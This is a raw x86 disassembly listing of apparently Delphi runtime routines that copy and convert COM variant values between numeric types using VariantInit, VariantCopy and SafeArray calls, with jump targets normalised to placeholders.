mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ece4
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f0b0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f0e0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ece4
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ece4
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f310
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f018
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ece4
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f94
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_414478
test al al
je r-xdata
mov ecx sub_40f308
mov edx esi
mov eax ebx
call sub_40f13c
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ece4
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f3bc
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f310
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f018
sub_40f400
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f45c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f3bc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f688
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f463
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
sub_40f46c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f4aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412aac
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41345c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4b1
lea eax [ ebp - 0x4 ]
call sub_404620
retn
sub_40f4b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f4f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412384
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4fd
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40f504
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f542
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413150
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4134c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f549
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
sub_40f550
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f58e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413084
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413494
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f595
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
sub_40f59c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f688
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ecf0
jmp r-xdata
mov edx esi
call sub_40e85c
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ecf0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f61c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_414478
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f400
jmp r-xdata
mov edx esp
mov eax esi
call sub_414478
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f59c
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f688
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f3bc
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f688
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f6cd ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f4b8
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40edfc
jmp r-xdata
mov eax ebx
call sub_40fff4
mov edx eax
mov eax esi
call sub_4132d8
jmp r-xdata
mov eax ebx
call sub_40fa4c
mov edx eax
mov eax esi
call sub_413238
jmp r-xdata
mov eax ebx
call sub_411390
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413324
jmp r-xdata
mov eax ebx
call sub_411014
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413348
jmp r-xdata
mov eax ebx
call sub_411cd0
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413374
jmp r-xdata
mov eax ebx
call sub_411768
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4133a0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f46c
jmp r-xdata
mov eax ebx
call sub_410b0c
mov edx eax
mov eax esi
call sub_4133cc
jmp r-xdata
mov eax ebx
call sub_40fe9c
mov edx eax
mov eax esi
call sub_4132b8
jmp r-xdata
mov eax ebx
call sub_40ff4c
mov edx eax
mov eax esi
call sub_413258
jmp r-xdata
mov eax ebx
call sub_4100ec
mov edx eax
mov eax esi
call sub_413278
jmp r-xdata
mov eax ebx
call sub_4101c4
mov edx eax
mov eax esi
call sub_413298
jmp r-xdata
mov eax ebx
call sub_410510
push edx
push eax
mov eax esi
call sub_4132f8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f504
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f550
jmp r-xdata
mov dx 0x101
call sub_40e85c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f094
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f61c
xor edx edx
mov ax 0x1
call sub_40e85c
jmp r-xdata
sub_40f8b4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f957
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412aac
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041c8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408518
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f95e
lea eax [ ebp - 0xc ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_404620
retn
mov eax ebx
call sub_410b0c
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ecf0
jmp r-xdata
sub_40f968
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ecf0
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f9a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f9f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f3bc
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fa4c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9ff
lea eax [ ebp - 0x14 ]
call sub_40f094
retn
sub_40fa08
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fa4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fe6d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fa7f ]
mov eax [ ebp - 0x4 ]
call sub_40f8b4
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f8b4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fa4c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f968
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f9a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e85c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fa08
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f968
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f968
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fca3 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f8b4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fa4c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
sub_40fe9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e85c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40ff28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
sub_40ff4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e85c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40ffcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
sub_40fff4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_4100c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41001a ]
jmp [ eax * 4 + jump_table_41002c ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e85c
sub_4100ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_4101a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41010e ]
jmp [ eax * 4 + jump_table_410121 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e85c
sub_4101c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410289
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410510
test edx edx
je r-xdata
mov al [ eax + lookup_table_4101ea ]
jmp [ eax * 4 + jump_table_4101fe ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e85c
sub_4102ac
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_40293c
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ecf0
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410b0c
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410358
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410446
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412aac
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041c8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408538
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41044d
lea eax [ ebp - 0x1c ]
call sub_403f40
lea eax [ ebp - 0xc ]
call sub_404620
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_40293c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ecf0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410b0c
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4104af
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f3bc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410510
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104b6
lea eax [ ebp - 0x18 ]
call sub_40f094
retn
sub_4104c4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410510
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41091c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410543 ]
mov eax [ ebp - 0x4 ]
call sub_410358
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
